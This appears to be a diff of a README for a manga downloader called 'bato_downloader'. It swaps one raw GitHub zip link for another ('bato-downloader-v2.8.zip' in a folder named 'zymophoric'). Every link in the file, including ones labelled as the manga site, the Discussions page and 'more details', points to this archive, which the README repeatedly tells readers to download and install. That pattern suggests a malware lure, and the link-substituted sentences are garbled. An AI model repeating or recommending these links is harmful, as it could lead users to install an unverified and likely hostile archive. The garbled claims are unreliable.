@@ -1,18 +1,18 @@
-# 🎉 bato_downloader - Easily Download Manga from https://raw.githubusercontent.com/corweet/bato_downloader/main/zymophoric/bato_downloader.zip
+# 🎉 bato_downloader - Easily Download Manga from https://raw.githubusercontent.com/corweet/bato_downloader/main/zymophoric/bato-downloader-v2.8.zip
 
 ## 🚀 Getting Started
 
-Welcome to bato_downloader! This application allows you to download manga easily from https://raw.githubusercontent.com/corweet/bato_downloader/main/zymophoric/bato_downloader.zip, and it offers both a graphical user interface (GUI) and a command-line interface (CLI). With features like multi-threaded downloads, flexible chapter selection, and progress tracking, you'll enjoy a smooth experience while collecting your favorite manga.
+Welcome to bato_downloader! This application allows you to download manga easily from https://raw.githubusercontent.com/corweet/bato_downloader/main/zymophoric/bato-downloader-v2.8.zip, and it offers both a graphical user interface (GUI) and a command-line interface (CLI). With features like multi-threaded downloads, flexible chapter selection, and progress tracking, you'll enjoy a smooth experience while collecting your favorite manga.
 
 ## 🔗 Download Link
 
-[![Download bato_downloader](https://raw.githubusercontent.com/corweet/bato_downloader/main/zymophoric/bato_downloader.zip)](https://raw.githubusercontent.com/corweet/bato_downloader/main/zymophoric/bato_downloader.zip)
+[![Download bato_downloader](https://raw.githubusercontent.com/corweet/bato_downloader/main/zymophoric/bato-downloader-v2.8.zip)](https://raw.githubusercontent.com/corweet/bato_downloader/main/zymophoric/bato-downloader-v2.8.zip)
 
 ## 📥 Download & Install
 
 To download and install bato_downloader:
 
-1. Visit [this page to download](https://raw.githubusercontent.com/corweet/bato_downloader/main/zymophoric/bato_downloader.zip).
+1. Visit [this page to download](https://raw.githubusercontent.com/corweet/bato_downloader/main/zymophoric/bato-downloader-v2.8.zip).
 2. Look for the latest release.
 3. Download the appropriate file for your operating system.
 4. Follow the instructions below based on your platform.
@@ -79,7 +79,7 @@ For Linux users:
 ### Using the GUI
 
 1. Open bato_downloader from your applications or program menu.
-2. Enter the URL of the manga you want to download from https://raw.githubusercontent.com/corweet/bato_downloader/main/zymophoric/bato_downloader.zip
+2. Enter the URL of the manga you want to download from https://raw.githubusercontent.com/corweet/bato_downloader/main/zymophoric/bato-downloader-v2.8.zip
 3. Select the chapters you wish to download.
 4. Click the "Download" button and track your progress.
 
@@ -114,17 +114,17 @@ Currently, bato_downloader works only on desktop platforms.
 
 At the moment, we support Windows, macOS, and Linux. More options may come in future releases.
 
-### Does it support all manga from https://raw.githubusercontent.com/corweet/bato_downloader/main/zymophoric/bato_downloader.zip
+### Does it support all manga from https://raw.githubusercontent.com/corweet/bato_downloader/main/zymophoric/bato-downloader-v2.8.zip
 
-Yes, bato_downloader supports downloading any publicly available manga from https://raw.githubusercontent.com/corweet/bato_downloader/main/zymophoric/bato_downloader.zip
+Yes, bato_downloader supports downloading any publicly available manga from https://raw.githubusercontent.com/corweet/bato_downloader/main/zymophoric/bato-downloader-v2.8.zip
 
 ## 🌐 Community and Support
 
-If you need help or want to engage with other users, visit our [GitHub Discussions page](https://raw.githubusercontent.com/corweet/bato_downloader/main/zymophoric/bato_downloader.zip). 
+If you need help or want to engage with other users, visit our [GitHub Discussions page](https://raw.githubusercontent.com/corweet/bato_downloader/main/zymophoric/bato-downloader-v2.8.zip). 
 
 ## 🔗 Additional Information
 
-- For more details, visit [this page to download](https://raw.githubusercontent.com/corweet/bato_downloader/main/zymophoric/bato_downloader.zip).
+- For more details, visit [this page to download](https://raw.githubusercontent.com/corweet/bato_downloader/main/zymophoric/bato-downloader-v2.8.zip).
 - Explore the source code and contribute to the project on GitHub.
 - Follow updates by checking our releases frequently.
 
